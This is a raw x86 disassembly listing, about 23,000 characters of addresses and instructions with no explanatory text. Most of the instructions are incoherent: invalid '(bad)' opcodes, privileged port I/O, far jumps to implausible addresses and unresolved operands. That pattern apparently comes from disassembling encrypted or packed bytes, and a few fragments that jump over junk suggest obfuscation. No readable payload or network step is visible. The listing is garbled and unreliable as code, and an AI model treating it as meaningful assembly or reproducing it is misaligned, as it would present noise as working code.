  405885:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405886:	adc    al,0xdb
  405888:	cmp    BYTE PTR [ebx+0x66],dl
  40588b:	or     eax,0xbe165c85
  405890:	rcl    BYTE PTR [esp+eiz*4-0x54],cl
  405894:	lds    ecx,FWORD PTR [ebx+ecx*8+0x2d5c91d]
  40589b:	mov    ah,0x51
  40589d:	fsubr  QWORD PTR [edx+edx*2-0x6f]
  4058a1:	js     0x40583b
  4058a3:	and    esp,edx
  4058a5:	fisubr DWORD PTR [ecx+0x16]
  4058a8:	in     eax,0xf2
  4058aa:	cmp    BYTE PTR [eax-0x2d334186],bl
  4058b0:	mov    eax,0x7286547b
  4058b5:	ret    
  4058b6:	in     al,0x6b
  4058b8:	sar    BYTE PTR [esi],cl
  4058ba:	push   ebx
  4058bb:	xchg   ecx,eax
  4058bc:	xchg   esp,eax
  4058bd:	push   ds
  4058be:	outs   dx,BYTE PTR ds:[esi]
  4058bf:	call   0x1e8281c4
  4058c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058c5:	ret    
  4058c6:	xchg   edi,eax
  4058c7:	and    BYTE PTR [edi+0x76],dh
  4058ca:	inc    ecx
  4058cb:	pusha  
  4058cc:	xchg   BYTE PTR [edx-0x5274aaf4],dh
  4058d2:	jnp    0x4058e1
  4058d4:	leave  
  4058d5:	je     0x405878
  4058d7:	lea    edi,[ecx+ebx*1]
  4058da:	push   ebx
  4058db:	mov    esp,0x1010f591
  4058e0:	stos   DWORD PTR es:[edi],eax
  4058e1:	cmp    BYTE PTR [eax+0x6f],bl
  4058e4:	mov    bl,BYTE PTR [ecx]
  4058e6:	cld    
  4058e7:	pop    ds
  4058e8:	xlat   BYTE PTR ds:[ebx]
  4058e9:	pop    edx
  4058ea:	popa   
  4058eb:	dec    esi
  4058ec:	lds    ebp,FWORD PTR [eax-0x2d3845bc]
  4058f2:	inc    eax
  4058f3:	push   ecx
  4058f4:	dec    esp
  4058f5:	cmp    BYTE PTR [eax],ah
  4058f7:	sbb    BYTE PTR [edi+0x4d4e727e],al
  4058fd:	test   DWORD PTR [ecx+0x2a],ecx
  405900:	lods   eax,DWORD PTR ds:[esi]
  405901:	add    eax,0x42d085ec
  405906:	pop    esp
  405907:	icebp  
  405908:	xchg   edi,eax
  405909:	or     bl,BYTE PTR [ecx]
  40590b:	jmp    0x4058ad
  40590d:	loope  0x405921
  40590f:	push   ebx
  405910:	(bad)  
  405911:	loope  0x4058b2
  405913:	xchg   BYTE PTR [ebx],bl
  405915:	xlat   BYTE PTR ds:[ebx]
  405916:	jecxz  0x405959
  405918:	imul   ebp,edi,0x56
  40591b:	idiv   ebp
  40591d:	pop    ebx
  40591e:	push   ebx
  40591f:	pop    ecx
  405920:	fsub   DWORD PTR [ecx]
  405922:	dec    esp
  405923:	add    eax,0x5eacf0cb
  405928:	push   ds
  405929:	add    edx,ecx
  40592b:	sub    al,0xc9
  40592d:	sti    
  40592e:	add    bh,BYTE PTR [ebx-0x5eb27744]
  405934:	push   esp
  405935:	call   0x8a64334a
  40593a:	bound  edx,QWORD PTR [eax]
  40593c:	mov    ebx,?
  40593e:	outs   dx,DWORD PTR ds:[esi]
  40593f:	sbb    bl,BYTE PTR [esi]
  405941:	fucomip st,st(7)
  405943:	repz jae 0x405920
  405946:	into   
  405947:	lahf   
  405948:	dec    esi
  405949:	fld    st(1)
  40594b:	mov    BYTE PTR [esp+esi*4],0xd
  40594f:	test   BYTE PTR [edx+0x69],al
  405952:	mov    dh,0x13
  405954:	fidivr WORD PTR [ecx+ebp*1-0x416e8050]
  40595b:	clc    
  40595c:	mul    BYTE PTR [edi]
  40595e:	retf   
  40595f:	iret   
  405960:	cmp    bh,BYTE PTR [edi+0x7f289579]
  405966:	sbb    eax,0xcdfa11c5
  40596b:	stc    
  40596c:	adc    al,0xed
  40596e:	adc    BYTE PTR [esi+0x34515493],ch
  405974:	call   0x99a36338
  405979:	lahf   
  40597a:	iret   
  40597b:	rcl    DWORD PTR [ecx-0x46],cl
  40597e:	sbb    DWORD PTR [eax-0x14],eax
  405981:	int    0xe5
  405983:	mov    bh,0xe1
  405985:	int3   
  405986:	fisttp QWORD PTR [ecx-0x4043bcd3]
  40598c:	(bad)  
  40598d:	cmp    DWORD PTR [esi],edi
  40598f:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  405991:	les    ebp,FWORD PTR gs:[ebx+0x7f]
  405995:	neg    DWORD PTR [ecx-0x453e4ee0]
  40599b:	or     ebp,ecx
  40599d:	jo     0x4059cd
  40599f:	bound  esp,QWORD PTR [edx-0x63]
  4059a2:	pop    edx
  4059a3:	jmp    0x39a37e3e
  4059a8:	or     al,0x17
  4059aa:	cmp    al,0x3a
  4059ac:	inc    eax
  4059ad:	out    0x46,al
  4059af:	inc    ebx
  4059b0:	mov    ebx,0x3fcddaf2
  4059b5:	jge    0x405a15
  4059b7:	scas   eax,DWORD PTR es:[edi]
  4059b8:	rcl    BYTE PTR [edx],cl
  4059ba:	stos   DWORD PTR es:[edi],eax
  4059bb:	sbb    esi,0x535e9f20
  4059c1:	pop    ebx
  4059c2:	xchg   ebp,eax
  4059c3:	sbb    al,0x2e
  4059c5:	sub    al,0x8d
  4059c7:	push   0x8d3e526
  4059cc:	cld    
  4059cd:	pop    ebp
  4059ce:	cwde   
  4059cf:	call   0x74b6:0x971bdacc
  4059d6:	inc    eax
  4059d7:	push   edi
  4059d8:	jl     0x4059c2
  4059da:	mov    bh,0x21
  4059dc:	(bad)  
  4059dd:	jnp    0x4059f5
  4059df:	jae    0x4059f8
  4059e1:	jl     0x405992
  4059e3:	aad    0x2f
  4059e5:	stos   BYTE PTR es:[edi],al
  4059e6:	pop    ecx
  4059e7:	or     dh,ch
  4059e9:	xor    DWORD PTR [esi],esp
  4059eb:	rcr    BYTE PTR [edi+0x66],cl
  4059ee:	adc    eax,0x750350bd
  4059f3:	adc    BYTE PTR [ebx],bh
  4059f5:	(bad)  
  4059f6:	jbe    0x4050e3
  4059fc:	pop    ebx
  4059fd:	mov    eax,0xf89c8539
  405a02:	pop    edi
  405a03:	pop    esi
  405a04:	leave  
  405a05:	ret    0xc
  405a08:	push   ebp
  405a09:	mov    ebp,esp
  405a0b:	mov    eax,DWORD PTR [ebp+0xc]
  405a0e:	jmp    0x405cfe
  405a13:	cmp    eax,0xd4d7d0c1
  405a18:	fnstcw WORD PTR ds:0xbbc9f8d9
  405a1e:	jecxz  0x405a57
  405a20:	and    al,0xde
  405a22:	add    al,0x67
  405a24:	cmp    BYTE PTR [eax+0x78],bh
  405a27:	dec    ebp
  405a28:	jle    0x405aa2
  405a2a:	js     0x4059b2
  405a2c:	mov    dh,0x49
  405a2e:	adc    al,0x48
  405a30:	iret   
  405a31:	inc    ecx
  405a32:	retf   
  405a33:	ins    BYTE PTR es:[edi],dx
  405a34:	leave  
  405a35:	test   al,0x20
  405a37:	nop
  405a38:	xor    DWORD PTR [esi+0x23],esi
  405a3b:	push   esp
  405a3c:	repnz aaa 
  405a3e:	hlt    
  405a3f:	daa    
  405a40:	jecxz  0x4059cb
  405a42:	addr16 in eax,0x83
  405a45:	or     DWORD PTR [ecx-0x13b66f8f],0x6d
  405a4c:	mov    dh,0x72
  405a4e:	or     edx,0x5fd7b158
  405a54:	jecxz  0x405ab0
  405a56:	dec    edx
  405a57:	jb     0x405a3d
  405a59:	push   cs
  405a5a:	and    eax,0x59378c8b
  405a5f:	or     esp,DWORD PTR [edx-0x4e]
  405a62:	std    
  405a63:	and    eax,0xa7236a70
  405a68:	mov    BYTE PTR [ebx-0x39],dl
  405a6b:	mov    esi,0xc83425fd
  405a70:	push   eax
  405a71:	loopne 0x405ad1
  405a73:	add    edi,ebx
  405a75:	addr16 es test eax,0xcd993579
  405a7c:	in     eax,dx
  405a7d:	pop    eax
  405a7e:	cmc    
  405a7f:	call   0x35ca731a
  405a84:	test   bh,0xf3
  405a87:	sbb    esp,DWORD PTR ss:[edi-0x15a474e0]
  405a8e:	stos   BYTE PTR es:[edi],al
  405a8f:	test   dl,bl
  405a91:	xchg   edx,eax
  405a92:	mov    eax,ds:0xec8ac1cb
  405a97:	in     eax,dx
  405a98:	xor    esi,edx
  405a9a:	cld    
  405a9b:	fsub   DWORD PTR [eax]
  405a9d:	or     BYTE PTR [ebx+0x7fee0b47],0x9f
  405aa4:	test   DWORD PTR [ebp+0x1b694de3],esp
  405aaa:	(bad)  
  405aab:	and    bl,BYTE PTR [ecx-0x68]
  405aae:	(bad)  
  405aaf:	fld    QWORD PTR ds:0xfe9e79
  405ab5:	mov    bl,BYTE PTR [edx+0x25]
  405ab8:	push   ebp
  405ab9:	aaa    
  405aba:	sub    edi,DWORD PTR [esi+0x6]
  405abd:	pop    DWORD PTR [edx]
  405abf:	sbb    ah,al
  405ac1:	add    edx,DWORD PTR [eax-0x2e]
  405ac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ac5:	mov    al,ds:0x3f5a1e1f
  405aca:	pop    ecx
  405acb:	mov    eax,0x36d2751
  405ad0:	xchg   DWORD PTR [edi-0x34],ebp
  405ad3:	adc    ah,bl
  405ad5:	xor    BYTE PTR [edi],ah
  405ad7:	adc    al,0xc3
  405ad9:	push   esp
  405ada:	sub    esi,DWORD PTR [eax-0x44e5441a]
  405ae0:	or     BYTE PTR [ebx+0xf],bl
  405ae3:	enter  0xcefd,0x70
  405ae7:	outs   dx,BYTE PTR ds:[esi]
  405ae8:	add    DWORD PTR [edx+0x6020e660],edi
  405aee:	cs mov edx,0x3d1f9de7
  405af4:	addr16 xor eax,0x298763b1
  405afa:	fidiv  WORD PTR ds:0x58fe01e8
  405b00:	jmp    0x6e6ca972
  405b05:	ror    BYTE PTR [edi-0x7a0b5ef3],cl
  405b0b:	inc    ebp
  405b0c:	mov    bl,0x95
  405b0e:	jge    0x405b64
  405b10:	mov    ebp,0x54596487
  405b15:	xor    edi,0x59
  405b18:	popa   
  405b19:	adc    edi,esp
  405b1b:	inc    eax
  405b1c:	sub    DWORD PTR [ebp+0x119e864],ecx
  405b22:	in     eax,0xb7
  405b24:	out    0x94,al
  405b26:	pop    ss
  405b27:	aam    0xbb
  405b29:	push   ebp
  405b2a:	int3   
  405b2b:	popa   
  405b2c:	pop    ecx
  405b2d:	push   eax
  405b2e:	bound  esp,QWORD PTR [esi+0x22]
  405b31:	lods   eax,DWORD PTR ds:[esi]
  405b32:	(bad)  
  405b33:	pop    edx
  405b34:	push   edi
  405b35:	fcmovnu st,st(6)
  405b37:	test   al,0xdf
  405b39:	inc    ebp
  405b3a:	pop    es
  405b3b:	jae    0x405b34
  405b3d:	add    DWORD PTR [edx-0x8],ecx
  405b40:	add    DWORD PTR [eax],ebx
  405b42:	add    dh,BYTE PTR [ecx-0xd]
  405b45:	jg     0x405b2a
  405b47:	jbe    0x405ba4
  405b49:	dec    edx
  405b4a:	pop    edi
  405b4b:	cmp    bl,BYTE PTR ss:0x6f5a07c7
  405b52:	std    
  405b53:	jo     0x405b2b
  405b55:	xchg   DWORD PTR [esi+edi*8+0x7c362d45],esi
  405b5c:	xchg   BYTE PTR [ebx-0x7c],ah
  405b5f:	cmp    ecx,ebx
  405b61:	push   eax
  405b62:	sbb    BYTE PTR [esp+edx*1+0x5591bfd5],al
  405b69:	repnz sub al,0xe
  405b6c:	cmp    eax,0xc37b315f
  405b71:	fsubp  st(1),st
  405b73:	inc    eax
  405b74:	push   ds
  405b75:	push   ds
  405b76:	push   ebp
  405b77:	pop    eax
  405b78:	iret   
  405b79:	cmp    eax,0x3c592051
  405b7e:	or     DWORD PTR [eax-0xc72d4d9],eax
  405b84:	push   ecx
  405b85:	push   0x7c
  405b87:	pop    edi
  405b88:	cmp    DWORD PTR es:[ebx+0x27],0xa9e420c5
  405b90:	scas   eax,DWORD PTR es:[edi]
  405b91:	cld    
  405b92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b93:	icebp  
  405b94:	fdivp  st(2),st
  405b96:	adc    al,0xf8
  405b98:	data16 mov BYTE PTR [ebx-0x4e],cl
  405b9c:	int    0x30
  405b9e:	sbb    al,0x6a
  405ba0:	push   es
  405ba1:	rcr    BYTE PTR [ebp-0x27292bc1],cl
  405ba7:	or     cl,0x68
  405baa:	mov    esi,0x93e087a3
  405baf:	sub    BYTE PTR [edi-0x4ec686cf],al
  405bb5:	mov    esp,0x62600135
  405bba:	push   ebp
  405bbb:	and    DWORD PTR [ebx-0x63],eax
  405bbe:	sub    eax,0xff2abb6c
  405bc3:	dec    edi
  405bc4:	sbb    ebp,ebx
  405bc6:	or     DWORD PTR [ebp-0x13],0x3e4f1ad0
  405bcd:	test   DWORD PTR [ebx],edi
  405bcf:	cmp    eax,0xf83c4e48
  405bd4:	out    0x6e,eax
  405bd6:	repz xchg edi,eax
  405bd8:	mov    eax,0xb01df21
  405bdd:	dec    edx
  405bde:	hlt    
  405bdf:	jl     0x405bb8
  405be1:	xlat   BYTE PTR ds:[ebx]
  405be2:	push   edi
  405be3:	icebp  
  405be4:	mov    esi,0x6dcd2646
  405be9:	fbld   TBYTE PTR es:[ebp-0x18]
  405bed:	imul   edi,DWORD PTR [edx+0xb88c7d2],0x50f771c5
  405bf7:	push   0x6b
  405bf9:	jb     0x405bef
  405bfb:	xor    esp,DWORD PTR [edi+0x6b]
  405bfe:	sub    BYTE PTR [edi-0x7a9e624c],al
  405c04:	and    al,0x31
  405c06:	cli    
  405c07:	add    esi,ebp
  405c09:	fnstsw WORD PTR [ebx]
  405c0b:	aam    0x9f
  405c0d:	xor    dl,BYTE PTR [edi]
  405c0f:	lea    eax,[esi+0x2d65f04e]
  405c15:	ret    0x3437
  405c18:	addr16 pop edx
  405c1a:	xchg   sp,ax
  405c1c:	mov    esi,0x21d22868
  405c21:	adc    DWORD PTR [ebx],0xcc2781b4
  405c27:	enter  0xdb20,0x1f
  405c2b:	mov    ds:0xd06cdbf9,al
  405c30:	nop
  405c31:	jle    0x405c7e
  405c33:	(bad)  
  405c34:	call   0xfd53:0x6595dc30
  405c3b:	adc    bh,0x2b
  405c3e:	mov    edx,0xaaf70427
  405c43:	mov    dl,ch
  405c45:	outs   dx,DWORD PTR ds:[esi]
  405c46:	in     al,0x67
  405c48:	icebp  
  405c49:	mov    bh,0x1d
  405c4b:	out    0xe3,eax
  405c4d:	push   es
  405c4e:	or     edx,edi
  405c50:	fwait
  405c51:	out    0x8f,eax
  405c53:	call   0x55aefe6d
  405c58:	stos   DWORD PTR es:[edi],eax
  405c59:	sahf   
  405c5a:	pop    DWORD PTR [ecx]
  405c5c:	aam    0xd3
  405c5e:	ficom  DWORD PTR [eax]
  405c60:	dec    esi
  405c61:	xor    eax,0x96a6a65c
  405c66:	mov    eax,ds:0x94815ccc
  405c6b:	test   eax,edi
  405c6d:	test   DWORD PTR [ebp+0x7b],eax
  405c70:	push   ecx
  405c71:	dec    ecx
  405c72:	lea    edx,[ecx+ebx*1]
  405c75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c76:	pop    edi
  405c77:	sub    bh,bl
  405c79:	mov    DWORD PTR [ecx],esp
  405c7b:	add    eax,0xb959ee76
  405c80:	call   0xdea75220
  405c85:	clc    
  405c86:	dec    edi
  405c87:	mov    ds:0x7f59de53,eax
  405c8c:	cli    
  405c8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c8e:	test   BYTE PTR [ebx+eax*1+0x19],al
  405c92:	xchg   edi,eax
  405c93:	stos   BYTE PTR es:[edi],al
  405c94:	pop    ebx
  405c95:	inc    edi
  405c96:	mov    ch,0x59
  405c98:	adc    al,0x29
  405c9a:	je     0x405c48
  405c9c:	xor    ecx,DWORD PTR [ebx+0x338164b9]
  405ca2:	pusha  
  405ca3:	push   esi
  405ca4:	mov    al,0x31
  405ca6:	add    al,0xd5
  405ca8:	stc    
  405ca9:	ret    
  405caa:	push   ds
  405cab:	inc    edx
  405cac:	mov    ecx,0x3d58ebd0
  405cb1:	icebp  
  405cb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cb3:	cli    
  405cb4:	mov    ah,0xa2
  405cb6:	jno    0x405d1b
  405cb8:	test   bh,al
  405cba:	mov    ds:0x1ebc7923,al
  405cbf:	cmp    al,0x44
  405cc1:	dec    esi
  405cc2:	mov    eax,ds:0x238f79f
  405cc7:	iret   
  405cc8:	or     eax,0x9d6ef5ef
  405ccd:	mov    cl,0x69
  405ccf:	loopne 0x405d00
  405cd1:	mov    ah,0x93
  405cd3:	sti    
  405cd4:	inc    DWORD PTR [eax-0x21827fac]
  405cda:	js     0x405cb4
  405cdc:	es int3 
  405cde:	add    DWORD PTR [edi-0x4a],edi
  405ce1:	dec    ecx
  405ce2:	xchg   esp,eax
  405ce3:	mov    edi,0x2acf1e68
  405ce8:	mov    eax,0x867e4312
  405ced:	retf   
  405cee:	stos   BYTE PTR es:[edi],al
  405cef:	mul    edi
  405cf1:	cmp    DWORD PTR [esi],0x3eb77edb
  405cf7:	pop    edi
  405cf8:	mov    ch,0xfb
  405cfa:	cdq    
  405cfb:	pop    esi
  405cfc:	loop   0x405d38
  405cfe:	xor    edx,edx
  405d00:	jmp    0x405ff0
  405d05:	rol    ebx,1
  405d07:	ror    cl,0xd6
  405d0a:	leave  
  405d0b:	rcr    ebx,1
  405d0d:	aaa    
  405d0e:	mov    eax,0x35d74c09
  405d13:	out    0xe3,al
  405d15:	mov    ah,0x3d
  405d17:	js     0x405d91
  405d19:	dec    ebp
  405d1a:	jle    0x405d94
  405d1c:	js     0x405cf0
  405d1e:	mov    esp,0xeed95796
  405d23:	test   DWORD PTR [edi],ecx
  405d25:	scas   eax,DWORD PTR es:[edi]
  405d26:	ins    DWORD PTR es:[edi],dx
  405d27:	inc    esi
  405d28:	into   
  405d29:	and    ebx,ecx
  405d2b:	mov    ch,0x85
  405d2d:	fcomp  DWORD PTR [edx-0x41]
  405d30:	(bad)  
  405d31:	lock and al,0xd3
  405d34:	mov    ebp,0x2fe058bc
  405d39:	(bad)  
  405d3a:	jl     0x405cda
  405d3c:	and    al,0x69
  405d3e:	lods   eax,DWORD PTR ds:[esi]
  405d3f:	div    bh
  405d41:	sub    eax,0x97abddd3
  405d46:	adc    DWORD PTR [ebx],ebx
  405d48:	mov    edi,0x9c82a7f6
  405d4d:	xchg   edx,eax
  405d4e:	ds jl  0x405d28
  405d51:	inc    esp
  405d52:	jge    0x405d4b
  405d54:	aad    0xbd
  405d56:	out    0xfc,eax
  405d58:	lods   al,BYTE PTR ds:[esi]
  405d59:	dec    eax
  405d5a:	ret    
  405d5b:	pop    esi
  405d5c:	jb     0x405cfb
  405d5e:	ds js  0x405d92
  405d61:	sub    BYTE PTR [ecx-0x4],dl
  405d64:	pop    ebp
  405d65:	and    DWORD PTR [ebx],0xc3c79d1b
  405d6b:	popf   
  405d6c:	ds pop ss
  405d6e:	mov    ebx,0xaafccb02
  405d73:	push   DWORD PTR [ebx+0x41be9bf4]
  405d79:	dec    esp
  405d7a:	xchg   ebp,eax
  405d7b:	jb     0x405dae
  405d7d:	inc    ebx
  405d7e:	and    ebx,DWORD PTR [ebx+ebp*4]
  405d81:	mov    BYTE PTR [edx],dl
  405d83:	add    DWORD PTR [eax-0x10f398d5],eax
  405d89:	(bad)  [eax-0x4990e673]
  405d8f:	int3   
  405d90:	shl    BYTE PTR [eax+0x3b],1
  405d93:	lods   eax,DWORD PTR ds:[esi]
  405d94:	sbb    al,0xdf
  405d96:	inc    eax
  405d97:	pusha  
  405d98:	jno    0x405d70
  405d9a:	add    al,0xce
  405d9c:	out    dx,al
  405d9d:	cdq    
  405d9e:	int    0xfe
  405da0:	hlt    
  405da1:	jnp    0x405d78
  405da3:	outs   dx,BYTE PTR ds:[esi]
  405da4:	cmp    dl,BYTE PTR [ecx+0x8]
  405da7:	dec    edx
  405da8:	cld    
  405da9:	jmp    0x725abb75
  405dae:	mov    ebp,0xb1fc5ac8
  405db3:	inc    ecx
  405db4:	adc    al,0xda
  405db6:	jmp    0xe9d1:0xac49d97b
  405dbd:	cmovle edi,esi
  405dc0:	out    dx,al
  405dc1:	test   al,0x7e
  405dc3:	xor    al,0x42
  405dc5:	cmp    DWORD PTR [edi],0xfffffff5
  405dc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dc9:	fs xchg esi,eax
  405dcb:	push   esp
  405dcc:	icebp  
  405dcd:	fs jg  0x405e21
  405dd0:	loope  0x405d86
  405dd2:	cmp    bl,BYTE PTR [eax+0x23]
  405dd5:	(bad)  
  405dd6:	js     0x405dc3
  405dd8:	shl    BYTE PTR [ebp-0x9],cl
  405ddb:	push   esi
  405ddc:	sbb    BYTE PTR [eax-0x5],bl
  405ddf:	aad    0xd7
  405de1:	cmp    eax,esp
  405de3:	ds sti 
  405de5:	mov    ch,0x1f
  405de7:	or     ch,BYTE PTR [ebx+0x4a1825ee]
  405ded:	pop    ebp
  405dee:	dec    eax
  405def:	inc    ebp
  405df0:	(bad)  
  405df1:	out    0xb4,al
  405df3:	mov    ah,0x92
  405df5:	sub    BYTE PTR [edx-0x13],dl
  405df8:	jnp    0x405e77
  405dfa:	adc    al,0x67
  405dfc:	sbb    ah,ch
  405dfe:	jge    0x405e0b
  405e00:	mov    bh,0xe6
  405e02:	fwait
  405e03:	test   al,0xeb
  405e05:	jmp    0x2f6982b
  405e0a:	in     eax,dx
  405e0b:	pop    ss
  405e0c:	inc    dh
  405e0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e0f:	cmp    ebp,DWORD PTR [ebx-0xa39b934]
  405e15:	(bad)  [eax+0x6d]
  405e18:	outs   dx,BYTE PTR ds:[esi]
  405e19:	mov    esi,0xe75f333d
  405e1e:	add    al,0xd3
  405e20:	imul   esp,DWORD PTR [esp+edx*8-0x78],0xd7ec9540
  405e28:	push   ecx
  405e29:	cmc    
  405e2a:	cmp    BYTE PTR [ebx+0x69c22659],dh
  405e30:	pop    ecx
  405e31:	jne    0x405ea4
  405e33:	idiv   dh
  405e35:	stos   BYTE PTR es:[edi],al
  405e36:	jbe    0x405e7c
  405e38:	sbb    al,0x24
  405e3a:	mov    eax,gs:0xdc0b3852
  405e40:	in     al,dx
  405e41:	daa    
  405e42:	pushf  
  405e43:	sbb    eax,DWORD PTR [ebx-0x4b]
  405e46:	push   edx
  405e47:	iret   
  405e48:	(bad)  
  405e4a:	mov    ebx,0xc531d143
  405e4f:	adc    al,0xc0
  405e51:	shl    BYTE PTR [ebx+0x4b],1
  405e54:	fisubr WORD PTR [edi]
  405e56:	scas   al,BYTE PTR es:[edi]
  405e57:	or     al,0x6b
  405e59:	outs   dx,BYTE PTR ds:[esi]
  405e5a:	shl    dh,0x7a
  405e5d:	xor    ebp,ebp
  405e5f:	ret    
  405e60:	inc    ebx
  405e61:	lock cld 
  405e63:	cmp    BYTE PTR [edi+0x60],0x7e
  405e67:	sbb    ecx,esp
  405e69:	dec    esi
  405e6a:	cmp    BYTE PTR [ebp+0x33],dl
  405e6d:	in     al,dx
  405e6e:	call   0xdae60be3
  405e73:	jae    0x405ea9
  405e75:	cld    
  405e76:	pop    esi
  405e77:	sub    DWORD PTR [eax],ebp
  405e79:	loope  0x405ea0
  405e7b:	jnp    0x405ec8
  405e7d:	outs   dx,DWORD PTR ds:[esi]
  405e7e:	clc    
  405e7f:	push   ecx
  405e80:	out    0xde,eax
  405e82:	mov    al,0x36
  405e84:	into   
  405e85:	ret    
  405e86:	vpmacssww xmm12,xmm2,XMMWORD PTR [eax-0x6fd65843],xmm7
  405e90:	fdiv   QWORD PTR ds:0x549330e5
  405e96:	xor    cl,BYTE PTR [esp+edi*8+0x61]
  405e9a:	stos   DWORD PTR es:[edi],eax
  405e9b:	pop    ecx
  405e9c:	aas    
  405e9d:	pop    esi
  405e9e:	aas    
  405e9f:	icebp  
  405ea0:	in     eax,0x20
  405ea2:	jl     0x405e32
  405ea4:	mov    dl,BYTE PTR [edi+0x37]
  405ea7:	push   ebp
  405ea8:	sbb    al,BYTE PTR [eax-0x56]
  405eab:	mov    edi,0xa0eedf08
  405eb0:	push   ecx
  405eb1:	sub    DWORD PTR [ebx-0x789cca59],ebp
  405eb7:	ja     0x405e6f
  405eb9:	mov    ah,0x1
  405ebb:	jmp    0x24cc:0x679cc5cc
  405ec2:	adc    edx,DWORD PTR [ecx+0x7f13736c]
  405ec8:	mov    esp,0x96d74d
  405ecd:	xchg   ebp,eax
  405ece:	add    edx,DWORD PTR [eax-0x21925cf3]
  405ed4:	(bad)
  405ed9:	mov    dl,0x78
  405edb:	pushf  
  405edc:	test   eax,0xc406cdec
  405ee1:	lods   al,BYTE PTR ds:[esi]
  405ee2:	test   BYTE PTR [eax+ecx*4+0x5afa3798],al
  405ee9:	pop    esi
  405eea:	out    dx,al
  405eeb:	int    0xfa
  405eed:	out    0x97,eax
  405eef:	xor    ebp,ebx
  405ef1:	or     al,0xcf
  405ef3:	inc    ecx
  405ef4:	mov    ecx,0x19a46301
  405ef9:	or     al,0xa7
  405efb:	xor    BYTE PTR [esi+eax*1],bh
  405efe:	leave  
  405eff:	arpl   WORD PTR [ebx+0x55],bx
  405f02:	sub    esi,esp
  405f04:	pusha  
  405f05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f06:	cmp    al,al
  405f08:	sbb    bh,BYTE PTR [ebp+0x19]
  405f0b:	push   0xffffffda
  405f0d:	in     eax,dx
  405f0e:	call   0xed3a9c57
  405f13:	jb     0x405f20
  405f15:	sar    BYTE PTR [ecx-0x3],0x8c
  405f19:	lods   al,BYTE PTR ds:[esi]
  405f1a:	fwait
  405f1b:	cli    
  405f1c:	lds    eax,FWORD PTR [ebp-0xd]
  405f1f:	or     eax,0x81403888
  405f24:	inc    eax
  405f25:	imul   edx,DWORD PTR [ebp+0x32],0x18379126
  405f2c:	mov    bl,0x1c
  405f2e:	fimul  WORD PTR [ecx-0x6b]
  405f31:	inc    ecx
  405f32:	push   edx
  405f33:	pop    ds
  405f34:	mov    eax,ds:0xba03b8f7
  405f39:	rol    BYTE PTR [ebp-0x4803b949],cl
  405f3f:	out    0x86,eax
  405f41:	adc    eax,0x9696cdec
  405f46:	cmp    al,ah
  405f48:	jnp    0x405ef0
  405f4a:	ret    
  405f4b:	out    0x64,eax
  405f4d:	das    
  405f4e:	mov    ?,WORD PTR [esi]
  405f50:	mov    dh,0x75
  405f52:	xor    al,0x79
  405f54:	xchg   edi,eax
  405f55:	ss stos DWORD PTR es:[edi],eax
  405f57:	jle    0x405f2d
  405f59:	and    eax,eax
  405f5b:	sub    BYTE PTR [edx+0xad79f80],dl
  405f61:	push   ss
  405f62:	jge    0x405f87
  405f64:	pop    es
  405f65:	mov    edx,DWORD PTR [eax-0x5b4f6761]
  405f6b:	test   eax,0x176dc70a
  405f70:	es mov eax,0xdce43c49
  405f76:	mov    ebx,0x46ad4453
  405f7b:	mov    bl,0x4b
  405f7d:	jns    0x405f97
  405f7f:	aas    
  405f80:	test   eax,0xd53cfead
  405f85:	dec    edx
  405f86:	mov    WORD PTR [edx-0x242e741f],ss
  405f8c:	inc    ecx
  405f8d:	cs sub eax,0x33f0c9d0
  405f93:	xor    BYTE PTR [eax-0x546197d6],ch
  405f99:	(bad)
  405f9c:	retf   0x77da
  405f9f:	jno    0x405f86
  405fa1:	jae    0x405f24
  405fa3:	cmp    BYTE PTR [eax-0x227eed14],bh
  405fa9:	and    ebx,edx
  405fab:	xchg   BYTE PTR [ecx+0x42954499],al
  405fb1:	mov    esp,0x49a5fb81
  405fb6:	(bad)
  405fb9:	mov    ds:0x8bbbe9c7,al
  405fbe:	sbb    edi,DWORD PTR [ebx-0x576e0c73]
  405fc4:	xchg   ebx,eax
  405fc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fc6:	add    al,0xeb
  405fc8:	adc    DWORD PTR [ebx-0x49],edx
  405fcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fcc:	sub    eax,0xe64bc5d8
  405fd1:	adc    esp,esp
  405fd3:	mov    edi,0x962e8681
  405fd8:	mov    ds:0x164ac736,eax
  405fdd:	xor    al,0x80
  405fdf:	and    esi,DWORD PTR [di]
  405fe2:	add    BYTE PTR [eax],bl
  405fe4:	inc    edi
  405fe5:	(bad)  
  405fe6:	cs repz cs dec esp
  405fea:	in     al,0x77
  405fec:	dec    edx
  405fed:	xchg   ebp,edi
  405fef:	mov    al,ds:0x64fd50b9
  405ff4:	jb     0x405fdf
  405ff6:	jmp    0x405ffa
  405ff8:	add    BYTE PTR [eax],al
  405ffa:	iret   
  405ffb:	rcl    ebx,cl
  405ffd:	retf   
  405ffe:	ror    ebx,cl
  406000:	xlat   BYTE PTR ds:[ebx]
  406001:	(bad)  [ecx]
  406003:	lods   eax,DWORD PTR ds:[esi]
  406004:	and    al,0xa9
  406006:	fidiv  DWORD PTR [edx-0x3d76dbd2]
  40600c:	js     0x406086
  40600e:	dec    ebp
  40600f:	jle    0x406089
  406011:	js     0x406077
  406013:	fdivr  DWORD PTR [ebx+0x6ff97e1]
  406019:	sbb    DWORD PTR [ebx+0x4957ccbc],eax
  40601f:	aas    
  406020:	call   0x5c93:0x76a470e2
  406027:	aam    0xcd
  406029:	xor    BYTE PTR [eax],dh
  40602b:	test   DWORD PTR [esi-0x7f],ebx
  40602e:	mov    ds:0x796d0424,eax
  406033:	mov    bl,0xef
  406035:	or     ebx,0x79e5826b
  40603b:	add    eax,0x33a4392a
  406040:	daa    
  406041:	(bad)  
  406042:	retf   
  406043:	push   esi
  406044:	scas   al,BYTE PTR es:[edi]
  406045:	mov    ecx,0x3b8e12ea
